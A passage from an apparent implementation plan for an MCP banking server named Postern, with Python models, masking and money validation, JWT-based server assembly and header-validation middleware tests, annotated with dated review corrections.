    binary floats cannot represent most decimal fractions exactly:
    `0.1 + 0.2 == 0.30000000000000004`. `Decimal`, `str` and `int` are all
    exact and pass through unchanged to pydantic's own `Decimal` validation;
    `Field(strict=True)` was measured and rejected, since it also rejects the
    `str` wire form a backend must use to avoid this exact hazard. A backend
    sends amounts as a decimal string (or an int for a whole-number amount),
    never a bare JSON number that a client-side float already corrupted.
    """
    if isinstance(value, float):
        raise ValueError(
            "amount must not be a float: binary floating point cannot represent "
            "a decimal amount exactly; send a decimal string or a Decimal"
        )
    return value


MoneyAmount = Annotated[Decimal, BeforeValidator(_reject_float)]


class Money(BaseModel):
    """An amount is never a bare number through this channel (handoff §6.5)."""

    model_config = ConfigDict(extra="forbid", frozen=True)

    amount: MoneyAmount
    currency: CurrencyCode
```

**Corrected against what execution actually found (2026-09-12, coordinator review):** the
plan originally typed `amount: Decimal` with no further guard. `Decimal` accepts a `float`
without complaint, coercing it through `str(float)`; measured on the original code,
`Money(amount=0.1 + 0.2, currency="EUR").model_dump_json()` produced
`{"amount":"0.30000000000000004","currency":"EUR"}` — an IEEE 754 binary-float artifact
serialized as a money amount and handed to a model that reads it out to a bank customer.
`Field(strict=True)` was measured as an alternative and rejected: it also rejects the
`str` wire form (`is_instance_of` on `"340.00"`), which is the safe form a backend must
use to avoid the float hazard in the first place. The `BeforeValidator` above was measured
to accept `Decimal`, `str` and `int` and reject only `float` (and, as a side effect,
`bool`, since pydantic's own `Decimal` core schema does not coerce a `bool`).
`str` is accepted deliberately: a backend that sends JSON and parses it with `json.loads`
gets a `float` for any bare JSON number, so a decimal string is the only exact wire form.
`int` is accepted because it is exact by construction. `Money(amount=Decimal("340.00"),
currency="EUR").model_dump_json()` still produces exactly `{"amount":"340.00","currency":"EUR"}`,
trailing zeros preserved.

- [ ] **Step 4: Write `identity.py`**

```python
# packages/postern-core/src/postern_core/identity.py
"""Customer identity. The token is the identity (handoff §6.2).

`user_id` is never a tool argument and is never returned to the client.
Every tool resolves the customer through a `CustomerResolver`.
"""

from typing import Annotated, Protocol

from pydantic import BaseModel, ConfigDict, StringConstraints

# `cust` is the only namespace this codebase mints (handoff §7.2's example
# claim is `"sub": "cust:7f3a..."`; test fixtures across this repo use the
# underscore form `cust_7f3a`, so both separators are accepted). Anchoring on
# a literal namespace prefix is what actually rejects an IBAN, PAN, bare
# account number or national id: all of those are also short alphanumeric
# strings, so a bare `[A-Za-z0-9_:-]{4,64}` character-class guard accepts an
# IBAN outright (24 alphanumeric characters sits inside 4..64) and proves
# nothing about opacity. The namespace prefix is the actual guarantee; the
# token issuer is the one place trusted to hand out `cust:`/`cust_` values.
_OPAQUE = r"^cust[:_][A-Za-z0-9]{1,60}$"


class CustomerRef(BaseModel):
    """An opaque reference. Never an IBAN, account number or national id (§7.2)."""

    model_config = ConfigDict(extra="forbid", frozen=True)

    value: Annotated[str, StringConstraints(pattern=_OPAQUE)]


class CustomerResolver(Protocol):
    """Resolves the calling customer from ambient request state.

    Production reads the validated access token. Tests inject a fake. There is
    deliberately no argument: nothing the model can set may influence this.
    """

    def __call__(self) -> CustomerRef: ...
```

**Corrected against what execution actually found (2026-09-12):** the plan originally specified `_OPAQUE = r"^[A-Za-z0-9_:-]{4,64}$"` with the justifying prose "IBANs exceed the character class only by length." That prose is wrong: an IBAN is entirely alphanumeric and typically 15-34 characters, so it sits *inside* that class, not outside it — `CustomerRef(value="ES9121000418450200051332")` (24 alphanumeric characters) validates successfully against it, and `test_customer_ref_is_opaque` does not fail as claimed below. A character-class guard alone cannot distinguish an opaque token from an IBAN, a PAN, a bare account number or an email address, because all of those are also short strings drawn from a similar alphabet. The fix anchors on the literal `cust:`/`cust_` namespace prefix from handoff §7.2's example claim (`"sub": "cust:7f3a..."`) and this repo's own fixtures (`cust_7f3a`), which is what actually makes the value's provenance — "minted only by the token issuer" — a checkable property rather than an assertion.

- [ ] **Step 5: Write `models.py`**

```python
# packages/postern-core/src/postern_core/domain/models.py
"""The MCP-facing contract (handoff §8.4).

Deliberately distinct from backend response shapes so tool schemas stay stable
while backends refactor. Counterparty account identifiers are absent by design
(§6.5): name only, never an account number.
"""

from typing import Annotated, Literal

from pydantic import AwareDatetime, BaseModel, ConfigDict, StringConstraints

from postern_core.domain.masking import MaskedIban, MaskedPan
from postern_core.domain.money import Money

Ref = Annotated[str, StringConstraints(pattern=r"^[a-z]{3}_[A-Za-z0-9]{1,32}$")]


class _Strict(BaseModel):
    model_config = ConfigDict(
        extra="forbid",
        frozen=True,
        validate_assignment=True,
    )


class Account(_Strict):
    ref: Ref
    label: str
    iban: MaskedIban


class Balance(_Strict):
    account_ref: Ref
    amount: Money
    as_of: AwareDatetime


class Transaction(_Strict):
    ref: Ref
    account_ref: Ref
    booked_at: AwareDatetime
    amount: Money
    direction: Literal["debit", "credit"]
    counterparty_name: str
    description: str


class Card(_Strict):
    ref: Ref
    label: str
    pan: MaskedPan
    status: Literal["active", "frozen", "cancelled"]


class ConsentSummary(_Strict):
    domain: Literal["accounts", "transactions", "cards", "payments"]
    granted: bool
    expires_at: AwareDatetime | None


class SessionInfo(_Strict):
    """Return value of the bootstrap tool (handoff §4.2)."""

    accounts: list[Account]
    consents: list[ConsentSummary]
    write_enabled: list[str]
    confirmation_note: str
```

`Annotated[str, AfterValidator]` runs on validation only. `model_construct` skips validation entirely by design (it exists to build a model from already-trusted data without re-running validators) and no `ConfigDict` option changes that, so it cannot be closed by configuration. It is forbidden by convention in this codebase: no tool or façade function may call `Card.model_construct`, `Account.model_construct`, or the equivalent on any other model in this module. The backstop is the golden masking test (Task 7) on serialized tool output, which catches a `model_construct` misuse the same way it catches any other raw passthrough.

**Corrected against what execution actually found (2026-09-12, coordinator review):** the
plan originally typed `expires_at: datetime | None`, inconsistent with `Balance.as_of` and
`Transaction.booked_at`, which both use `AwareDatetime`. This was an oversight, not a
deliberate exception: a naive expiry compared against an aware "now" raises `TypeError`,
and a naive timestamp shown to a customer in an unknown zone is exactly the ambiguity
`AwareDatetime` exists to remove elsewhere in this same module. Changed to
`AwareDatetime | None`; the unused `from datetime import datetime` import is dropped
along with it, since nothing else in the module names `datetime` directly.

- [ ] **Step 6: Write the failing test for the `model_copy` bypass**

```python
# Add to tests/test_domain_models.py
def test_model_copy_update_remasks_rather_than_storing_raw() -> None:
    """model_copy(update=...) is the natural idiom for patching one field of
    a backend-derived model, and it bypasses Annotated validators even under
    frozen=True. _Strict overrides model_copy to re-validate (Task 2 review)."""
    card = Card(ref="crd_1", label="Debit", pan="4111111111114417", status="active")
    patched = card.model_copy(update={"pan": "4111111111114417"})
    assert patched.pan == "•••• 4417"
    assert "4111111111114417" not in patched.model_dump_json()
```

Run: `uv run pytest tests/test_domain_models.py -q`
Expected: FAIL against a `_Strict` without the `model_copy` override, `AssertionError` on `patched.pan`.

- [ ] **Step 7: Write the failing test for the hidden-input leak**

```python
# Add to tests/test_domain_models.py
def test_validation_error_never_echoes_the_raw_identifier() -> None:
    """Pydantic's default ValidationError.__str__ embeds `input_value=...`
    for the field that failed. Without hide_input_in_errors=True on _Strict,
    the raw string below appears verbatim in str(exc)."""
    with pytest.raises(ValidationError) as exc_info:
        Card(ref="crd_1", label="Debit", pan="my card is 4111111111114417 thanks", status="active")
    assert "4111111111114417" not in str(exc_info.value)
```

Run: `uv run pytest tests/test_domain_models.py -q`
Expected: FAIL against a `_Strict` without `hide_input_in_errors=True`, the raw digits are present in `str(exc_info.value)`.

- [ ] **Step 8: Add the fix that makes both failing tests pass**

Add `Mapping` and `Self` to the imports at the top of `models.py`
(`from collections.abc import Mapping` and `from typing import ..., Any, Self`),
then replace `_Strict`:

```python
class _Strict(BaseModel):
    model_config = ConfigDict(
        extra="forbid",
        frozen=True,
        validate_assignment=True,
        hide_input_in_errors=True,
    )

    def model_copy(self, *, update: Mapping[str, Any] | None = None, deep: bool = False) -> Self:
        """Re-validate on update, so masking cannot be bypassed (see Task 2 review)."""
        if update:
            return type(self).model_validate({**self.model_dump(), **update})
        return super().model_copy(deep=deep)
```

Run: `uv run pytest tests/test_domain_models.py -q`
Expected: PASS. The `model_copy` override closes Step 6's failure; `hide_input_in_errors=True`
closes Step 7's failure. `hide_input_in_errors` scrubs only `str()`/`repr()` of a
`ValidationError`, not its `errors()` output or `.json()` (see the "Verified facts" entry
above) — that gap is why `postern_core.domain.masking` documents the caller obligation
directly and why Task 2's tests assert against `errors(include_input=False)`.

- [ ] **Step 9: Run the full test file to verify it passes**

Run: `uv run pytest tests/test_domain_models.py -q`
Expected: PASS, 11 passed

- [ ] **Step 10: Commit**

```bash
git add packages/postern-core/src/postern_core/domain/money.py \
        packages/postern-core/src/postern_core/domain/models.py \
        packages/postern-core/src/postern_core/identity.py \
        tests/test_domain_models.py
git commit -m "feat(domain): MCP-facing models, Money, and opaque customer identity"
```

**Addendum from the Task 3 adversarial pass (2026-09-12), beyond the 10 steps above:**
`_Strict.model_copy`'s re-validation (Step 8) closes the bypass for a nested *dict*
update, but Pydantic's default `revalidate_instances="never"` means a field typed
`list[Account]` accepts an already-`Account`-typed instance as-is, skipping its
validators — including one built via the forbidden `Account.model_construct()`. This
is reachable through a plain `SessionInfo(accounts=[bad_account], ...)` call, with no
`model_copy` involved at all. `_Strict.model_config` adds `revalidate_instances="always"`
to close it; `tests/test_domain_models.py::test_nested_model_construct_bypass_is_remasked_on_parent_construction`
is the regression test (written first, observed failing with the raw IBAN surviving into
`session.model_dump_json()`, then closed by the config change). This brings the file to
12 passed, not 11 — the extra test is the adversarial-pass addition, not one of the 10
steps' original 11.

**Second addendum (2026-09-12, coordinator review of the adversarial pass):** two items
reported but not fixed in the first pass were fixed on coordinator instruction. `Money`
now rejects a bare `float` amount (see the correction above Step 3) and
`ConsentSummary.expires_at` is now `AwareDatetime | None` (see the correction above Step
6's failing-test steps). Five more tests were added the same way: written first against
the pre-fix code, observed failing (`test_money_rejects_a_float_amount` and
`test_consent_summary_rejects_a_naive_expiry` both failed with `DID NOT RAISE
ValidationError`), then closed by the two fixes. This brings the file to 17 passed.

Recorded rather than fixed at the time: `Money` still enforced no scale or precision — a
value with more decimal places than its currency allows (e.g. `Decimal("1.23456789")` for
`"EUR"`) was accepted and serialized as given. Superseded by the third addendum below,
which closes the float-artifact shape of this gap (more than 4 decimal places) without
needing the ISO 4217 minor-unit table; true per-currency precision (rejecting 3 decimal
places for `"EUR"` specifically, which only allows 2) still needs that table and is still
not established — see "What this plan deliberately does not establish" below.

**Third addendum (2026-09-12, coordinator security review — two Criticals, both
reproduced):**

*Critical 1 — `Money` derived from `BaseModel`, not `_Strict`, so none of the Step 8 fixes
reached it.* Measured before this fix: `Money(amount=Decimal(str(0.1 + 0.2)),
currency="EUR")` (the `Decimal(str(x))` idiom a façade might write to "safely" convert a
number) produced `{"amount":"0.30000000000000004",...}`; `Money(...).model_copy(update=
{"amount": 0.1 + 0.2})` produced a **bare JSON float**, `{"amount":0.30000000000000004,...}`;
and embedding that bad `Money` in a `Balance` carried it through untouched, because
`revalidate_instances` is read from the *nested field's own class* (`Money`), not the
parent's — `Balance` setting `revalidate_instances="always"` on itself never mattered.

Fix: `_Strict` moved out of `models.py` into a new module,
`packages/postern-core/src/postern_core/domain/base.py`, so `money.py` can import it
without a cycle (`models.py` already imports `money.py`). `Money` now derives from
`_Strict`, not `BaseModel`. `models.py` imports `_Strict` from `.base` instead of defining
it. `_Strict.model_copy` also gained two corrections while it was being read closely for
this fix: the truthiness check `if update:` is now `if update is not None:` (a caller
passing `update={}` must still take the re-validating path, not silently fall through to
the raw `super().model_copy()` just because an empty dict is falsy), and the unvalidated
copy is now produced via `super().model_copy(update=dict(update), deep=deep)` first — so
`deep` is honoured exactly as pydantic's own `model_copy` honours it — before being
re-validated via `model_validate(unvalidated.model_dump())`, rather than manually
re-merging `self.model_dump()` with `update` (behaviourally equivalent for the existing
tests, but no longer silently discarding `deep`).

`money.py` gained `_reject_imprecise_decimal`, an `AfterValidator` that rejects a
`Decimal` whose exponent implies more than 4 decimal places, run after pydantic's own
`Decimal` coercion (`_reject_float`'s `BeforeValidator` runs before it, `Field(
allow_inf_nan=False)` sits between the two). 4 decimal places is above every real ISO
4217 minor unit and below every float artifact measured (`0.1 + 0.2`'s repr has 17;
`Decimal(0.1)`'s exact binary value has 55), so it closes `Decimal(str(0.1 + 0.2))` and
`Decimal(0.1)` without needing the currency table. `Field(allow_inf_nan=False)` pins the
`NaN`/`Infinity` rejection explicitly; it was previously an unstated side effect of
pydantic-core's own default for `Decimal`, not something this module's code or tests said.

The reviewer's own regression test almost passes as written, with one correction found
by running it: `bad = Money(amount=Decimal("1.00"), currency="EUR").model_copy(update=
{"amount": 0.1 + 0.2})` now raises immediately, one line earlier than the test originally
assumed, because `Money` inheriting `_Strict`'s `model_copy` closes the bypass at its
source rather than only at the point of embedding it in `Balance`. Both statements are
wrapped in the same `pytest.raises` in `tests/test_domain_models.py::
test_bad_money_cannot_reach_a_parent_models_serialized_output` so the test passes
regardless of which of the two now closes it.

*Critical 2 — free-text fields were unguarded, and remittance text is exactly where IBANs
live.* Measured, plain constructor, no bypass: `Transaction(..., description="SEPA CT
ES9121000418450200051332 CARD 4111111111114417").model_dump_json()` contained both the
raw IBAN and the raw PAN. Unstructured remittance information is where counterparty IBANs
and card references appear in ISO 20022 traffic, and this lands in a vendor chat history
unrecallable — the primary threat in `CLAUDE.md`.

Fix: `FreeText` added to `packages/postern-core/src/postern_core/domain/masking.py`
(a Task 2 file; this addition happened during Task 3's security review, not Task 2
itself). Unlike `MaskedPan`/`MaskedIban`, which validate that a whole value *is* a PAN or
IBAN, `FreeText` scans for PAN- and IBAN-*shaped substrings* inside a larger string and
redacts them in place, reusing `_MASK` and `_mod97_ok` from the same module. The IBAN scan
runs first, deliberately: an IBAN's digit run (e.g. 22 digits) would otherwise be
partially chewed by the 12-19-digit PAN scan before the IBAN scan ever saw it. An
IBAN-shaped substring that fails the mod-97 checksum is left unchanged (not a real IBAN,
e.g. a merchant reference that happens to look like one); there is no equivalent checksum
for a PAN-shaped digit run, so any 12-19-digit run is masked regardless of context —
over-redaction by design, consistent with this module's existing preference for a false
positive over a leak. No separator handling (no grouped `"4111 1111 1111 4417"` detection
inside free text): `MaskedPan`/`MaskedIban` own that job for a value that IS a PAN/IBAN;
this only has to stop a contiguous run reaching a client.

Applied to `Transaction.description`, `Transaction.counterparty_name`, `Account.label`,
`Card.label` and `SessionInfo.confirmation_note` in `models.py`. Task 9's `scrub_free_text`
is dropped in favour of this — see the correction note at the top of Task 9 below.

*Two small fixes, both in `identity.py`:* `CustomerRef.model_config` gained
`hide_input_in_errors=True`. Measured before the fix: `CustomerRef(value=
"ES9121000418450200051332")` leaked the raw value in `str()`, `repr()`, `errors()` *and*
`.json()`; for every other `_Strict` model in this codebase, `str()`/`repr()` are already
clean and only `errors()`/`.json()` need `include_input=False`, so the codebase-wide
assumption "only `errors()` leaks" was false specifically for `CustomerRef`, and `str(exc)`
is what `logger.exception` writes. And the module comment explaining `_OPAQUE` was
corrected: it no longer calls the `cust:`/`cust_` prefix "the actual guarantee" (overstated);
it is a provenance convention the token issuer is trusted to follow, not a proof of opacity.

*Recorded, not fixed:* `CustomerRef`'s `^cust[:_][A-Za-z0-9]{1,60}$` still accepts
`cust_ES9121000418450200051332` (an IBAN), `cust_12345678Z` (a Spanish DNI shape) and
`cust_4111111111114417` (a PAN) as the suffix after the namespace prefix. Tightening the
suffix to the issuer's actual minted-token shape needs the platform team to say what that
shape is. Added as an open item next to ZT-2 below, worded as a requirement on the token
issuer (the `sub` claim must not be a national id, account number or PAN), not as a defect
in this code to fix unilaterally.

Test count: `tests/test_domain_models.py` gained 9 tests (the `Money` NaN/Infinity/exponent-
boundary/`Decimal(str(float))`/`Decimal(float)` cases, the `Transaction.description`
integration test, and the reviewer's regression test) and `tests/test_masking_types.py`
gained 3 (`FreeText` redacts an embedded IBAN and PAN, leaves ordinary merchant text
unchanged, leaves an IBAN-shaped-but-invalid-checksum string unchanged). Full suite: 70
passed.

---

### Task 4: Server assembly with an injected resolver

**Files:**
- Create: `packages/postern-core/src/postern_core/facade/protocol.py`
- Create: `services/api/settings.py`
- Create: `services/api/server.py`
- Test: `tests/conftest.py`, `tests/test_server_assembly.py`

Handoff §3.2 and the `2026-07-28` revision: no in-process session state, any request lands on any instance. `stateless_http=True` and `json_response=True` are what keep that true behind a plain load balancer.

**Corrected against execution (Task 4, 2026-09-12).** Three defects surfaced while implementing this task from the original draft below; all three are fixed in the code blocks that follow, not just noted:

1. **`from postern_core.facade.client import BackendClient` does not exist at this point in the sequence** — that module is Task 6's. `build_server` never calls the backend itself (no tool exists yet to do so), so it has no business depending on Task 6's concrete, httpx2-based client. Fixed by adding a minimal `Protocol` (`postern_core.facade.protocol.BackendReader`, one async method, `get_json`) and typing the `backend` parameter with it — the same seam `postern_core.identity.CustomerResolver` already uses for the resolver. Task 6's `BackendClient` satisfies it structurally; see the note added to Task 6 below.
2. **`cache_ttl=settings.cache_ttl_ms` passed a milliseconds value into a seconds parameter.** Confirmed empirically: `fastmcp/server/caching.py` builds `CacheHint(ttl_ms=cache_ttl * 1000, ...)`, and its own module docstring states `cache_ttl` is "(seconds)". A server built with `FastMCP(cache_ttl=60, cache_scope="private")` and probed through the in-process `Client`'s `list_tools_mcp()` emits `ttlMs: 60000` on the wire (`raw.model_dump(by_alias=True)`) — confirming the seconds-to-milliseconds multiply, and confirming `cacheScope: "private"` does reach the wire. Passing the old `cache_ttl_ms` default of `60_000` straight through would have produced a `ttlMs` of 60,000,000 (≈16.7 hours) instead of the intended 60 seconds. Fixed by renaming the field to `cache_ttl_seconds` (default `60`) and the env var to `POSTERN_CACHE_TTL_SECONDS`.
3. **`from tests.conftest import TEST_CUSTOMER` was checked, not just trusted.** `tests/__init__.py` already exists, making `tests` a real package; pytest's own conftest auto-load and the explicit `from tests.conftest import ...` both resolve to the same `sys.modules["tests.conftest"]` entry (verified: a print statement in the module body executed exactly once across the whole suite, and `id(sys.modules["tests.conftest"])` was stable across test files). Kept as originally drafted; no fragility found in this repo.

- [ ] **Step 1: Write the failing test**

```python
# tests/test_server_assembly.py
from fastmcp import FastMCP
from fastmcp.client import Client

from services.api.server import build_server
from services.api.settings import Settings


def test_build_server_returns_a_fastmcp_instance() -> None:
    server = build_server(Settings.for_testing(), resolver=lambda: _REF, backend=None)
    assert isinstance(server, FastMCP)


def test_server_starts_with_no_tools_registered() -> None:
    server = build_server(Settings.for_testing(), resolver=lambda: _REF, backend=None)
    assert server.name == "postern"


async def test_client_can_list_tools_in_process() -> None:
    server = build_server(Settings.for_testing(), resolver=lambda: _REF, backend=None)
    async with Client(transport=server) as client:
        assert await client.list_tools() == []
```

```python
# tests/conftest.py
import pytest

from postern_core.identity import CustomerRef, CustomerResolver

TEST_CUSTOMER = CustomerRef(value="cust_7f3a")


@pytest.fixture
def resolver() -> CustomerResolver:
    """Stands in for the access-token resolver (design decision D3)."""
    return lambda: TEST_CUSTOMER
```

Add `_REF = TEST_CUSTOMER` by importing it in the test module: `from tests.conftest import TEST_CUSTOMER as _REF`.

The fixture needs a return type (`-> CustomerResolver`) or `mypy --strict` rejects it with `Function is missing a return type annotation` — found running the `type` gate, not drafting the code.

The executed version of `tests/test_server_assembly.py` also adds tests for the adversarial-pass findings below (`Settings.from_env()` against an empty environment, the `ttlMs`/`cacheScope` wire measurement, and three cases for `token_customer_resolver`, including the leak check in finding 2). See the file itself; not reproduced here to avoid drift between two copies of the same tests.

- [ ] **Step 2: Run the test to verify it fails**

Run: `uv run pytest tests/test_server_assembly.py -q`
Expected: FAIL, `ModuleNotFoundError: No module named 'services.api.server'` (import order in the executed test file resolves `services.api.server` before `services.api.settings`, so this is the module actually reported missing first)

- [ ] **Step 3: Write the backend Protocol**

```python
# packages/postern-core/src/postern_core/facade/protocol.py
"""The structural contract `build_server` requires of a backend (Task 4).

Mirrors the seam `postern_core.identity.CustomerResolver` already uses for the
customer resolver. Kept to exactly the one read method later tasks use. Task
6's `BackendClient` must satisfy this Protocol structurally; it does not
import it.
"""

from collections.abc import Mapping
from typing import Any, Protocol

from postern_core.identity import CustomerRef


class BackendReader(Protocol):
    """The one read operation a tool handler needs from the backend façade."""

    async def get_json(
        self,
        path: str,
        *,
        customer: CustomerRef,
        audience: str = "accounts.svc",
        params: Mapping[str, Any] | None = None,
    ) -> Any: ...
```

- [ ] **Step 4: Write `settings.py`**

```python
# services/api/settings.py
import os
from dataclasses import dataclass


@dataclass(frozen=True)
class Settings:
    backend_base_url: str
    customer_jwks_uri: str | None = None
    customer_token_issuer: str | None = None
    audience: str = "postern"
    strict_headers: bool = False
    cache_ttl_seconds: int = 60

    @classmethod
    def from_env(cls) -> "Settings":
        return cls(
            backend_base_url=os.environ["POSTERN_BACKEND_BASE_URL"],
            customer_jwks_uri=os.environ["POSTERN_JWKS_URI"],
            customer_token_issuer=os.environ["POSTERN_TOKEN_ISSUER"],
            audience=os.environ.get("POSTERN_AUDIENCE", "postern"),
            strict_headers=os.environ.get("POSTERN_STRICT_HEADERS") == "1",
            cache_ttl_seconds=int(os.environ.get("POSTERN_CACHE_TTL_SECONDS", "60")),
        )

    @classmethod
    def for_testing(cls) -> "Settings":
        return cls(backend_base_url="https://backend.test")
```

`from_env` uses `os.environ[...]` for the three that have no safe default, so a missing one fails at startup rather than at the first customer request. Verified with an empty environment: the resulting `KeyError`'s `args[0]` is exactly the variable name (e.g. `POSTERN_BACKEND_BASE_URL`), which is a clear enough signal in a startup traceback, but it is a bare `KeyError`, not a purpose-built configuration exception — flagged in the adversarial pass, not changed.

- [ ] **Step 5: Write `server.py`**

```python
# services/api/server.py
"""MCP server assembly.

The customer resolver is injected (design decision D3) so that:
  - there is exactly one place that answers "which customer is this?", and
  - tools are testable without an auth round trip, which FastMCP's in-process
    Client does not support (it accepts no auth argument).

`backend` is typed as `postern_core.facade.protocol.BackendReader`, a minimal
Protocol, not the concrete `postern_core.facade.client.BackendClient`
(Task 6): that module does not exist yet, and `build_server` never calls the
backend itself, only passes it through to tools registered in later tasks.
"""

from fastmcp import FastMCP
from fastmcp.server.auth.providers.jwt import JWTVerifier
from pydantic import ValidationError

from postern_core.facade.protocol import BackendReader
from postern_core.identity import CustomerRef, CustomerResolver
from services.api.settings import Settings

SERVER_INSTRUCTIONS = """\
Postern exposes read access to the customer's own bank accounts, cards and
transactions. Call `banking_start_session` first: it returns the accounts you
may reference, which domains are consented, and the rules for this session.

Reference accounts and cards by their `ref` values, never by IBAN or card
number. Amounts are always structured with an explicit currency and an `as_of`
timestamp; report them as given and do not restate them in another currency.
Transaction history defaults to the last 30 days and must be widened explicitly.
"""


def token_customer_resolver() -> CustomerRef:
    """Production resolver: the token is the identity (handoff §6.2)."""
    from fastmcp.server.dependencies import get_access_token

    token = get_access_token()
    if token is None:
        raise PermissionError("request carries no validated access token")
    subject = token.claims.get("sub")
    if not isinstance(subject, str):
        raise PermissionError("access token carries no subject claim")
    try:
        return CustomerRef(value=subject)
    except ValidationError:
        # `subject` is minted by the token issuer; identity.py's own comment
        # is explicit that this is a provenance convention, not proof of
        # opacity -- a compromised issuer could mint a PAN-, IBAN- or
        # DNI-shaped `sub`. `CustomerRef.hide_input_in_errors` scrubs only
        # `str()`/`repr()` of the resulting `ValidationError`; its structured
        # `.errors()` still carries the raw value, and that is exactly what
        # FastMCP's own dispatcher logs if a raw `pydantic.ValidationError`
        # escapes a tool. Re-raising a plain, unchained `PermissionError`
        # keeps the raw subject out of both the wire response and the log.
        raise PermissionError(
            "access token subject is not a recognized customer reference"
        ) from None


def build_server(
    settings: Settings,
    resolver: CustomerResolver,
    backend: BackendReader | None,
) -> FastMCP:
    has_jwks_uri = settings.customer_jwks_uri is not None
    has_issuer = settings.customer_token_issuer is not None
    if has_jwks_uri != has_issuer:
        # Exactly one set is a config typo, not a deliberate choice: neither
        # set is the documented no-auth path (`Settings.for_testing()`, the
        # local docker-compose stack); both set is normal production. Failing
        # open here -- silently returning `auth=None`, indistinguishable from
        # the deliberate no-auth path -- would serve a bank-facing MCP server
        # with no authentication at all on a forgotten or misspelled
        # environment variable. Fail startup instead.
        raise ValueError(
            "customer_jwks_uri and customer_token_issuer must both be set or "
            "both be unset (got customer_jwks_uri="
            f"{settings.customer_jwks_uri!r}, customer_token_issuer="
            f"{settings.customer_token_issuer!r})"
        )

    auth = None
    if has_jwks_uri and has_issuer:
        auth = JWTVerifier(
            jwks_uri=settings.customer_jwks_uri,
            issuer=settings.customer_token_issuer,
            audience=settings.audience,
            required_scopes=None,
        )

    return FastMCP(
        name="postern",
        instructions=SERVER_INSTRUCTIONS,
        auth=auth,
        cache_scope="private",
        cache_ttl=settings.cache_ttl_seconds,
    )
```

`required_scopes=None` is deliberate: scope checks are per tool, not global (Plan 2 adds them through consent-scoped visibility). `cache_scope="private"` is design decision D4; `cache_ttl=settings.cache_ttl_seconds` is now genuinely seconds (fixed defect 2 above).

**`SERVER_INSTRUCTIONS` describes the finished server, not this task's.** It tells the calling agent to "Call `banking_start_session` first"; no such tool exists until Task 11. A client connecting to exactly this build today would get a tool-not-found error on that first call. Not a bug in this task -- Task 11 registers the tool before any real deployment is implied to follow -- but noted here so the gap between what the instructions promise and what Task 4 actually registers (`test_server_starts_with_no_tools_registered`, `test_client_can_list_tools_in_process` above) is not mistaken for one later.

**Adversarial-pass finding, now fixed rather than only recommended:** `build_server` used to build a `JWTVerifier` only when *both* `customer_jwks_uri` and `customer_token_issuer` were set, so setting exactly one of the two (a plausible partial-misconfiguration or typo'd env var, though `Settings.from_env()` itself cannot produce this state since both reads are mandatory) silently yielded `server.auth is None` -- indistinguishable from the deliberate no-auth state `Settings.for_testing()` produces. Reproduced: `build_server(Settings(backend_base_url="x", customer_jwks_uri="https://j"), ...).auth is None` was `True`. Fixed by raising `ValueError` when exactly one of the two is set, naming both variables in the message; both set still builds the `JWTVerifier`, neither set still yields `auth=None` for the deliberate no-auth path.

- [ ] **Step 6: Run the test to verify it passes**

Run: `uv run pytest tests/test_server_assembly.py -q`
Expected: PASS, 11 passed (3 from the original draft, 5 from the first adversarial pass, 3 from the fail-closed auth-config fix)

- [ ] **Step 7: Commit**

```bash
git add packages/postern-core/src/postern_core/facade/protocol.py services/api/settings.py services/api/server.py tests/conftest.py tests/test_server_assembly.py
git commit -m "feat(api): server assembly with injected customer resolver"
```

---

### Task 5: Header/body validation as ASGI middleware

**Files:**
- Create: `services/api/asgi/header_validation.py`
- Test: `tests/test_header_body_mismatch.py`

**This task exists in this shape because of a verified defect in the design docs.** Implementation guide §6.3 shows this check as a FastMCP `Middleware` raising `ToolError`. FastMCP 4 returns a `ToolError` as `CallToolResult(is_error=True)` inside HTTP **200** and offers no documented way to set the HTTP status from that layer, while MCP `2026-07-28` requires **HTTP 400 with `-32020`**. The check therefore runs as ASGI middleware above FastMCP.

Strictness follows design decision D2: a mismatch is always a 400; a missing header is a 400 only when `strict=True`, because FastMCP 4 serves five protocol revisions and older clients do not send these headers.

- [ ] **Step 1: Write the failing test**

```python
# tests/test_header_body_mismatch.py
import json

from services.api.asgi.header_validation import HeaderBodyValidation


async def _call(app, headers: dict[str, str], body: bytes) -> list[dict]:
    scope = {
        "type": "http",
        "http_version": "1.1",
        "method": "POST",
        "scheme": "http",
        "path": "/mcp",
        "raw_path": b"/mcp",
        "query_string": b"",
        "root_path": "",
        "headers": [(k.lower().encode(), v.encode()) for k, v in headers.items()],
        "server": ("test", 80),
        "client": ("test", 1234),
    }
    pending = [{"type": "http.request", "body": body, "more_body": False}]
    sent: list[dict] = []

    async def receive():
        return pending.pop(0) if pending else {"type": "http.disconnect"}

    async def send(message):
        sent.append(message)

    await app(scope, receive, send)
    return sent


def _downstream(seen: list[bytes]):
    async def app(scope, receive, send):
        body = b""
        while True:
            message = await receive()
            if message["type"] != "http.request":
                break
            body += message.get("body", b"")
            if not message.get("more_body", False):
                break
        seen.append(body)
        await send({"type": "http.response.start", "status": 200, "headers": []})
        await send({"type": "http.response.body", "body": b"{}"})

    return app


def _status(sent: list[dict]) -> int:
    return next(m["status"] for m in sent if m["type"] == "http.response.start")


def _json(sent: list[dict]) -> dict:
    raw = b"".join(m.get("body", b"") for m in sent if m["type"] == "http.response.body")
    return json.loads(raw)


CALL = json.dumps(
    {"jsonrpc": "2.0", "id": 7, "method": "tools/call",
     "params": {"name": "accounts.list", "arguments": {}}}
).encode()


async def test_matching_headers_pass_through_with_body_intact() -> None:
    seen: list[bytes] = []
    app = HeaderBodyValidation(_downstream(seen))
    sent = await _call(app, {"Mcp-Method": "tools/call", "Mcp-Name": "accounts.list"}, CALL)
    assert _status(sent) == 200
    assert seen == [CALL]


async def test_method_mismatch_is_rejected_with_400_and_32020() -> None:
    app = HeaderBodyValidation(_downstream([]))
    sent = await _call(app, {"Mcp-Method": "tools/list", "Mcp-Name": "accounts.list"}, CALL)
    assert _status(sent) == 400
    assert _json(sent)["error"]["code"] == -32020


async def test_name_mismatch_is_rejected_with_400_and_32020() -> None:
    app = HeaderBodyValidation(_downstream([]))
    sent = await _call(app, {"Mcp-Method": "tools/call", "Mcp-Name": "payments.create"}, CALL)
    assert _status(sent) == 400
    assert _json(sent)["error"]["code"] == -32020


async def test_rejection_echoes_the_request_id() -> None:
    app = HeaderBodyValidation(_downstream([]))
    sent = await _call(app, {"Mcp-Method": "tools/list", "Mcp-Name": "accounts.list"}, CALL)
    assert _json(sent)["id"] == 7


async def test_downstream_never_runs_on_mismatch() -> None:
    seen: list[bytes] = []
    app = HeaderBodyValidation(_downstream(seen))
    await _call(app, {"Mcp-Method": "tools/list", "Mcp-Name": "accounts.list"}, CALL)
    assert seen == []


async def test_missing_headers_pass_when_not_strict() -> None:
